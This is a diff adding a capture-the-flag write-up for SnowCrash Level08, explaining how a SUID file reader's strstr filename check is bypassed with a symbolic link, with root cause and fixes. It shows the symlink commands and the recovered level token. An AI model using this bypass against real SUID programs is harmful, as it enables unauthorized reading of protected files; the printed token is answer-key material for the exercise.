@@ -1,0 +1,144 @@
+SnowCrash – Level08 Write-Up
+============================
+
+Goal
+----
+Exploit the SUID binary `level08` to retrieve the token for the next level.
+
+Step 1 – Binary Analysis
+------------------------
+Running `strings level08` reveals important clues:
+
+    open
+    read
+    write
+    strstr
+    token
+    You may not access '%s'
+    Unable to open %s
+
+From this we can infer:
+- The program reads a file given as argument.
+- It blocks access to files containing the string "token".
+- It uses strstr() to perform this check.
+
+Step 2 – Reconstructing the Logic
+---------------------------------
+
+The program likely behaves like this:
+
+    if (argc < 2)
+        printf("%s [file to read]\n", argv[0]);
+
+    if (strstr(argv[1], "token") != NULL)
+    {
+        printf("You may not access '%s'\n", argv[1]);
+        exit(1);
+    }
+
+    fd = open(argv[1], O_RDONLY);
+    read(fd, buffer, size);
+    write(1, buffer, size);
+
+This means:
+- It denies access only if the filename contains the substring "token".
+- It does NOT check the actual file being opened after path resolution.
+
+Step 3 – Identifying the Vulnerability
+--------------------------------------
+
+The vulnerability is:
+
+    Symlink Bypass / Improper File Access Control
+
+More specifically:
+The program checks the *string* of the filename,
+but open() resolves symbolic links at the filesystem level.
+
+The validation and the actual file access do not match.
+
+Step 4 – Exploitation Strategy
+------------------------------
+
+The protected file is:
+    /home/user/level08/token
+
+If we try:
+    ./level08 token
+
+The program blocks access.
+
+However, we can create a symbolic link:
+
+    ln -s /home/user/level08/token /tmp/myfile
+
+Now run:
+
+    ./level08 /tmp/myfile
+
+Explanation:
+- argv[1] is "/tmp/myfile"
+- strstr("/tmp/myfile", "token") returns NULL
+- The check passes
+- open() follows the symlink
+- The real token file is opened
+- The contents are printed
+
+Result:
+    quif5eloekouj29ke0vouxean
+
+Token successfully retrieved.
+
+Why This Works
+--------------
+
+The program performs access control using:
+
+    strstr(argv[1], "token")
+
+But file resolution happens in:
+
+    open()
+
+Since open() follows symbolic links,
+the program ends up opening the protected file
+without detecting it.
+
+Root Cause
+----------
+
+- Performing security checks on user input strings.
+- Not validating the resolved real path.
+- Relying on filename filtering instead of proper file permissions.
+
+Vulnerability Type
+------------------
+
+- Symlink Attack
+- Access Control Bypass
+- Improper Input Validation (CWE-20)
+
+Security Impact
+---------------
+
+- Bypass of intended file access restrictions.
+- Privilege escalation via SUID binary.
+- Unauthorized reading of protected files.
+
+Proper Fix
+----------
+
+Possible secure approaches:
+
+1. Use realpath() to resolve the true path before checking.
+2. Compare inodes instead of filename strings.
+3. Avoid SUID file readers entirely.
+4. Enforce proper filesystem permissions.
+
+Conclusion
+----------
+
+Level08 is vulnerable to a Symlink-based Access Control Bypass.
+The program attempts to block access to files containing "token"
+by checking the filename string, but fails to account for symbolic
+links, allowing an attacker to read the protected token file.
